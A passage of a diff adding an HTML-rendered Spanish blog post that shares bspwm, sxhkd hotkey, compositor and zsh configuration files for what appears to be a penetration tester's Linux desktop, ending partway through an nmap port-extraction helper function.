+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;active-opacity &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 0.95&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+inactive-opacity &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 0.80&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+frame-opacity &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 0.80&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+
+backend &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;glx&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+
+opacity-rule &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;
+        &lt;span class=&quot;s2&quot;&gt;&quot;50:class_g = 'Bspwm' &amp;amp;&amp;amp; class_i = 'presel_feedback'&quot;&lt;/span&gt;,
+        &lt;span class=&quot;s2&quot;&gt;&quot;80:class_g = 'Rofi'&quot;&lt;/span&gt;,
+        &lt;span class=&quot;s2&quot;&gt;&quot;80:class_g = 'Caja'&quot;&lt;/span&gt;,
+        &lt;span class=&quot;s2&quot;&gt;&quot;99:class_g = 'Google-chrome'&quot;&lt;/span&gt;,
+        &lt;span class=&quot;s2&quot;&gt;&quot;99:class_g = 'Firefox'&quot;&lt;/span&gt;,
+        &lt;span class=&quot;s2&quot;&gt;&quot;99:class_g = 'Atom'&quot;&lt;/span&gt;,
+        &lt;span class=&quot;s2&quot;&gt;&quot;99:class_g = 'burp-StartBurp'&quot;&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+
+blur-background &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;true&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h2 id=&quot;archivo-sxhkdrc&quot;&gt;Archivo sxhkdrc&lt;/h2&gt;
+
+&lt;p&gt;Este sería el archivo de configuración situado bajo &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;~/.config/sxhkd&lt;/code&gt;:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;#&lt;/span&gt;
+&lt;span class=&quot;c&quot;&gt;# wm independent hotkeys&lt;/span&gt;
+&lt;span class=&quot;c&quot;&gt;#&lt;/span&gt;
+
+&lt;span class=&quot;c&quot;&gt;# terminal emulator&lt;/span&gt;
+super + Return
+	gnome-terminal
+
+&lt;span class=&quot;c&quot;&gt;# program launcher&lt;/span&gt;
+super + d
+	rofi &lt;span class=&quot;nt&quot;&gt;-show&lt;/span&gt; run
+
+&lt;span class=&quot;c&quot;&gt;# make sxhkd reload its configuration files:&lt;/span&gt;
+super + Escape
+	pkill &lt;span class=&quot;nt&quot;&gt;-USR1&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-x&lt;/span&gt; sxhkd
+
+&lt;span class=&quot;c&quot;&gt;#&lt;/span&gt;
+&lt;span class=&quot;c&quot;&gt;# bspwm hotkeys&lt;/span&gt;
+&lt;span class=&quot;c&quot;&gt;#&lt;/span&gt;
+
+&lt;span class=&quot;c&quot;&gt;# quit/restart bspwm&lt;/span&gt;
+super + alt + &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;q,r&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
+	bspc &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;quit,wm &lt;span class=&quot;nt&quot;&gt;-r&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
+
+&lt;span class=&quot;c&quot;&gt;# close and kill&lt;/span&gt;
+super + &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;_,shift + &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;w
+	bspc node -&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;c,k&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
+
+&lt;span class=&quot;c&quot;&gt;# alternate between the tiled and monocle layout&lt;/span&gt;
+super + m
+	bspc desktop &lt;span class=&quot;nt&quot;&gt;-l&lt;/span&gt; next
+
+&lt;span class=&quot;c&quot;&gt;# send the newest marked node to the newest preselected node&lt;/span&gt;
+super + y
+	bspc node newest.marked.local &lt;span class=&quot;nt&quot;&gt;-n&lt;/span&gt; newest.!automatic.local
+
+&lt;span class=&quot;c&quot;&gt;# swap the current node and the biggest node&lt;/span&gt;
+super + g
+	bspc node &lt;span class=&quot;nt&quot;&gt;-s&lt;/span&gt; biggest
+
+&lt;span class=&quot;c&quot;&gt;#&lt;/span&gt;
+&lt;span class=&quot;c&quot;&gt;# state/flags&lt;/span&gt;
+&lt;span class=&quot;c&quot;&gt;#&lt;/span&gt;
+
+&lt;span class=&quot;c&quot;&gt;# set the window state&lt;/span&gt;
+super + &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;t,shift + t,s,f&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
+	bspc node &lt;span class=&quot;nt&quot;&gt;-t&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;tiled,pseudo_tiled,floating,fullscreen&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
+
+&lt;span class=&quot;c&quot;&gt;# set the node flags&lt;/span&gt;
+super + ctrl + &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;m,x,y,z&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
+	bspc node &lt;span class=&quot;nt&quot;&gt;-g&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;marked,locked,sticky,private&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
+
+&lt;span class=&quot;c&quot;&gt;#&lt;/span&gt;
+&lt;span class=&quot;c&quot;&gt;# focus/swap&lt;/span&gt;
+&lt;span class=&quot;c&quot;&gt;#&lt;/span&gt;
+
+&lt;span class=&quot;c&quot;&gt;# focus the node in the given direction&lt;/span&gt;
+&lt;span class=&quot;c&quot;&gt;#super + {_,shift + }{h,j,k,l}&lt;/span&gt;
+&lt;span class=&quot;c&quot;&gt;#	bspc node -{f,s} {west,south,north,east}&lt;/span&gt;
+
+super + &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;_,shift + &lt;span class=&quot;o&quot;&gt;}{&lt;/span&gt;Left,Down,Up,Right&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
+       bspc node -&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;f,s&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;west,south,north,east&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
+
+
+&lt;span class=&quot;c&quot;&gt;# focus the node for the given path jump&lt;/span&gt;
+super + &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;p,b,comma,period&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
+	bspc node &lt;span class=&quot;nt&quot;&gt;-f&lt;/span&gt; @&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;parent,brother,first,second&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
+
+&lt;span class=&quot;c&quot;&gt;# focus the next/previous node in the current desktop&lt;/span&gt;
+super + &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;_,shift + &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;c
+	bspc node &lt;span class=&quot;nt&quot;&gt;-f&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;next,prev&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;.local
+
+&lt;span class=&quot;c&quot;&gt;# focus the next/previous desktop in the current monitor&lt;/span&gt;
+super + bracket&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;left,right&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
+	bspc desktop &lt;span class=&quot;nt&quot;&gt;-f&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;prev,next&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;.local
+
+&lt;span class=&quot;c&quot;&gt;# focus the last node/desktop&lt;/span&gt;
+super + &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;grave,Tab&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
+	bspc &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;node,desktop&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-f&lt;/span&gt; last
+
+&lt;span class=&quot;c&quot;&gt;# focus the older or newer node in the focus history&lt;/span&gt;
+super + &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;o,i&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
+	bspc wm &lt;span class=&quot;nt&quot;&gt;-h&lt;/span&gt; off&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
+	bspc node &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;older,newer&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-f&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
+	bspc wm &lt;span class=&quot;nt&quot;&gt;-h&lt;/span&gt; on
+
+&lt;span class=&quot;c&quot;&gt;# focus or send to the given desktop&lt;/span&gt;
+super + &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;_,shift + &lt;span class=&quot;o&quot;&gt;}{&lt;/span&gt;1-9,0&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
+	bspc &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;desktop &lt;span class=&quot;nt&quot;&gt;-f&lt;/span&gt;,node &lt;span class=&quot;nt&quot;&gt;-d&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'^{1-9,10}'&lt;/span&gt;
+
+&lt;span class=&quot;c&quot;&gt;#&lt;/span&gt;
+&lt;span class=&quot;c&quot;&gt;# preselect&lt;/span&gt;
+&lt;span class=&quot;c&quot;&gt;#&lt;/span&gt;
+
+&lt;span class=&quot;c&quot;&gt;# preselect the direction&lt;/span&gt;
+super + ctrl + alt + &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;Left,Down,Up,Right&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
+	bspc node &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;west,south,north,east&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
+
+
+&lt;span class=&quot;c&quot;&gt;# preselect the ratio&lt;/span&gt;
+super + ctrl + &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;1-9&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
+	bspc node &lt;span class=&quot;nt&quot;&gt;-o&lt;/span&gt; 0.&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;1-9&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
+
+&lt;span class=&quot;c&quot;&gt;# cancel the preselection for the focused node&lt;/span&gt;
+super + ctrl + space
+	bspc node &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; cancel
+
+&lt;span class=&quot;c&quot;&gt;# cancel the preselection for the focused desktop&lt;/span&gt;
+super + ctrl + alt + space
+	bspc query &lt;span class=&quot;nt&quot;&gt;-N&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-d&lt;/span&gt; | xargs &lt;span class=&quot;nt&quot;&gt;-I&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;id&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-n&lt;/span&gt; 1 bspc node &lt;span class=&quot;nb&quot;&gt;id&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; cancel
+
+&lt;span class=&quot;c&quot;&gt;#&lt;/span&gt;
+&lt;span class=&quot;c&quot;&gt;# move/resize&lt;/span&gt;
+&lt;span class=&quot;c&quot;&gt;#&lt;/span&gt;
+
+&lt;span class=&quot;c&quot;&gt;# expand a window by moving one of its side outward&lt;/span&gt;
+&lt;span class=&quot;c&quot;&gt;#super + alt + {h,j,k,l}&lt;/span&gt;
+&lt;span class=&quot;c&quot;&gt;#	bspc node -z {left -20 0,bottom 0 20,top 0 -20,right 20 0}&lt;/span&gt;
+
+&lt;span class=&quot;c&quot;&gt;# contract a window by moving one of its side inward&lt;/span&gt;
+&lt;span class=&quot;c&quot;&gt;#super + alt + shift + {h,j,k,l}&lt;/span&gt;
+&lt;span class=&quot;c&quot;&gt;#	bspc node -z {right -20 0,top 0 20,bottom 0 -20,left 20 0}&lt;/span&gt;
+
+&lt;span class=&quot;c&quot;&gt;# move a floating window&lt;/span&gt;
+super + ctrl + &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;Left,Down,Up,Right&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
+	bspc node &lt;span class=&quot;nt&quot;&gt;-v&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-20&lt;/span&gt; 0,0 20,0 &lt;span class=&quot;nt&quot;&gt;-20&lt;/span&gt;,20 0&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
+
+&lt;span class=&quot;c&quot;&gt;# Custom move/resize&lt;/span&gt;
+alt + ctrl + &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;Left,Down,Up,Right&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
+	/home/jflabur/.config/bspwm/scripts/bspwm_resize &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;west,south,north,east&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
+
+
+&lt;span class=&quot;c&quot;&gt;# ---------------------------------------------&lt;/span&gt;
+&lt;span class=&quot;c&quot;&gt;# CUSTOM&lt;/span&gt;
+&lt;span class=&quot;c&quot;&gt;# ---------------------------------------------&lt;/span&gt;
+
+&lt;span class=&quot;c&quot;&gt;# Google-Chrome&lt;/span&gt;
+
+super + &lt;span class=&quot;nb&quot;&gt;shift&lt;/span&gt; + g
+	google-chrome
+
+&lt;span class=&quot;c&quot;&gt;# Open Burpsuite Professional&lt;/span&gt;
+
+super + ctrl + b
+	gksudo burp
+
+&lt;span class=&quot;c&quot;&gt;# block screen&lt;/span&gt;
+
+ctrl + super + p
+	i3lock-fancy
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h2 id=&quot;archivo-zshrc&quot;&gt;Archivo zshrc&lt;/h2&gt;
+
+&lt;p&gt;Este sería el archivo de configuración situado bajo &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;~/.zshrc&lt;/code&gt;:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# Fix the Java Problem&lt;/span&gt;
+&lt;span class=&quot;nb&quot;&gt;export &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;_JAVA_AWT_WM_NONREPARENTING&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1
+
+&lt;span class=&quot;c&quot;&gt;# Enable Powerlevel10k instant prompt. Should stay at the top of ~/.zshrc.&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[[&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-r&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;${&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;XDG_CACHE_HOME&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;:-&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$HOME&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;/.cache&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;/p10k-instant-prompt-&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;${&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(%)&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;:-&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;%n&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;.zsh&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;]]&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;then
+  &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;source&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;${&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;XDG_CACHE_HOME&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;:-&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$HOME&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;/.cache&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;/p10k-instant-prompt-&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;${&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(%)&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;:-&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;%n&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;.zsh&quot;&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;fi&lt;/span&gt;
+
+&lt;span class=&quot;c&quot;&gt;# Set up the prompt&lt;/span&gt;
+
+autoload &lt;span class=&quot;nt&quot;&gt;-Uz&lt;/span&gt; promptinit
+promptinit
+prompt adam1
+
+setopt histignorealldups sharehistory
+
+&lt;span class=&quot;c&quot;&gt;# Use emacs keybindings even if our EDITOR is set to vi&lt;/span&gt;
+bindkey &lt;span class=&quot;nt&quot;&gt;-e&lt;/span&gt;
+
+&lt;span class=&quot;c&quot;&gt;# Keep 1000 lines of history within the shell and save it to ~/.zsh_history:&lt;/span&gt;
+&lt;span class=&quot;nv&quot;&gt;HISTSIZE&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1000
+&lt;span class=&quot;nv&quot;&gt;SAVEHIST&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1000
+&lt;span class=&quot;nv&quot;&gt;HISTFILE&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;~/.zsh_history
+
+&lt;span class=&quot;c&quot;&gt;# Use modern completion system&lt;/span&gt;
+autoload &lt;span class=&quot;nt&quot;&gt;-Uz&lt;/span&gt; compinit
+compinit
+
+zstyle &lt;span class=&quot;s1&quot;&gt;':completion:*'&lt;/span&gt; auto-description &lt;span class=&quot;s1&quot;&gt;'specify: %d'&lt;/span&gt;
+zstyle &lt;span class=&quot;s1&quot;&gt;':completion:*'&lt;/span&gt; completer _expand _complete _correct _approximate
+zstyle &lt;span class=&quot;s1&quot;&gt;':completion:*'&lt;/span&gt; format &lt;span class=&quot;s1&quot;&gt;'Completing %d'&lt;/span&gt;
+zstyle &lt;span class=&quot;s1&quot;&gt;':completion:*'&lt;/span&gt; group-name &lt;span class=&quot;s1&quot;&gt;''&lt;/span&gt;
+zstyle &lt;span class=&quot;s1&quot;&gt;':completion:*'&lt;/span&gt; menu &lt;span class=&quot;k&quot;&gt;select&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;2
+&lt;span class=&quot;nb&quot;&gt;eval&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;$(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;dircolors&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-b&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;
+zstyle &lt;span class=&quot;s1&quot;&gt;':completion:*:default'&lt;/span&gt; list-colors &lt;span class=&quot;k&quot;&gt;${&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(s.&lt;/span&gt;:.&lt;span class=&quot;p&quot;&gt;)LS_COLORS&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;}&lt;/span&gt;
+zstyle &lt;span class=&quot;s1&quot;&gt;':completion:*'&lt;/span&gt; list-colors &lt;span class=&quot;s1&quot;&gt;''&lt;/span&gt;
+zstyle &lt;span class=&quot;s1&quot;&gt;':completion:*'&lt;/span&gt; list-prompt %SAt %p: Hit TAB &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;more, or the character to insert%s
+zstyle &lt;span class=&quot;s1&quot;&gt;':completion:*'&lt;/span&gt; matcher-list &lt;span class=&quot;s1&quot;&gt;''&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'m:{a-z}={A-Z}'&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'m:{a-zA-Z}={A-Za-z}'&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'r:|[._-]=* r:|=* l:|=*'&lt;/span&gt;
+zstyle &lt;span class=&quot;s1&quot;&gt;':completion:*'&lt;/span&gt; menu &lt;span class=&quot;k&quot;&gt;select&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;long
+zstyle &lt;span class=&quot;s1&quot;&gt;':completion:*'&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;select&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-prompt&lt;/span&gt; %SScrolling active: current selection at %p%s
+zstyle &lt;span class=&quot;s1&quot;&gt;':completion:*'&lt;/span&gt; use-compctl &lt;span class=&quot;nb&quot;&gt;false
+&lt;/span&gt;zstyle &lt;span class=&quot;s1&quot;&gt;':completion:*'&lt;/span&gt; verbose &lt;span class=&quot;nb&quot;&gt;true
+
+&lt;/span&gt;zstyle &lt;span class=&quot;s1&quot;&gt;':completion:*:*:kill:*:processes'&lt;/span&gt; list-colors &lt;span class=&quot;s1&quot;&gt;'=(#b) #([0-9]#)*=0=01;31'&lt;/span&gt;
+zstyle &lt;span class=&quot;s1&quot;&gt;':completion:*:kill:*'&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;command&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'ps -u $USER -o pid,%cpu,tty,cputime,cmd'&lt;/span&gt;
+&lt;span class=&quot;nb&quot;&gt;source&lt;/span&gt; /home/jflabur/powerlevel10k/powerlevel10k.zsh-theme
+
+&lt;span class=&quot;c&quot;&gt;# To customize prompt, run `p10k configure` or edit ~/.p10k.zsh.&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;[[&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-f&lt;/span&gt; ~/.p10k.zsh &lt;span class=&quot;o&quot;&gt;]]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;source&lt;/span&gt; ~/.p10k.zsh
+
+&lt;span class=&quot;c&quot;&gt;# Manual configuration&lt;/span&gt;
+
+&lt;span class=&quot;nv&quot;&gt;PATH&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/root/.local/bin:/snap/bin:/usr/sandbox/:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games:/usr/share/games:/usr/local/sbin:/usr/sbin:/sbin:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games
+
+&lt;span class=&quot;c&quot;&gt;# Manual aliases&lt;/span&gt;
+&lt;span class=&quot;nb&quot;&gt;alias &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;ll&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'lsd -lh --group-dirs=first'&lt;/span&gt;
+&lt;span class=&quot;nb&quot;&gt;alias &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;la&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'lsd -a --group-dirs=first'&lt;/span&gt;
+&lt;span class=&quot;nb&quot;&gt;alias &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;l&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'lsd --group-dirs=first'&lt;/span&gt;
+&lt;span class=&quot;nb&quot;&gt;alias &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;lla&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'lsd -lha --group-dirs=first'&lt;/span&gt;
+&lt;span class=&quot;nb&quot;&gt;alias ls&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'lsd --group-dirs=first'&lt;/span&gt;
+
+&lt;span class=&quot;nb&quot;&gt;alias cat&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'/usr/bin/bat'&lt;/span&gt;
+&lt;span class=&quot;nb&quot;&gt;alias &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;catn&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'/usr/bin/cat'&lt;/span&gt;
+&lt;span class=&quot;nb&quot;&gt;alias &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;catnl&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'/usr/bin/bat  --paging=never'&lt;/span&gt;
+
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-f&lt;/span&gt; ~/.fzf.zsh &lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;source&lt;/span&gt; ~/.fzf.zsh
+
+&lt;span class=&quot;c&quot;&gt;# Plugins&lt;/span&gt;
+&lt;span class=&quot;nb&quot;&gt;source&lt;/span&gt; /usr/share/zsh-syntax-highlighting/zsh-syntax-highlighting.zsh
+&lt;span class=&quot;nb&quot;&gt;source&lt;/span&gt; /usr/share/zsh-autosuggestions/zsh-autosuggestions.zsh
+&lt;span class=&quot;nb&quot;&gt;source&lt;/span&gt; /usr/share/zsh-sudo/sudo.plugin.zsh
+
+&lt;span class=&quot;c&quot;&gt;# Functions&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;function &lt;/span&gt;mkt&lt;span class=&quot;o&quot;&gt;(){&lt;/span&gt;
+	&lt;span class=&quot;nb&quot;&gt;mkdir&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;nmap,content,exploits,scripts&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
+
+&lt;span class=&quot;c&quot;&gt;# Extract nmap information&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;function &lt;/span&gt;extractPorts&lt;span class=&quot;o&quot;&gt;(){&lt;/span&gt;
+	&lt;span class=&quot;nv&quot;&gt;ports&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;$(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$1&lt;/span&gt; | &lt;span class=&quot;nb&quot;&gt;grep&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-oP&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'\d{1,5}/open'&lt;/span&gt; | &lt;span class=&quot;nb&quot;&gt;awk&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'{print $1}'&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;FS&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'/'&lt;/span&gt; | xargs | &lt;span class=&quot;nb&quot;&gt;tr&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;' '&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;','&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;
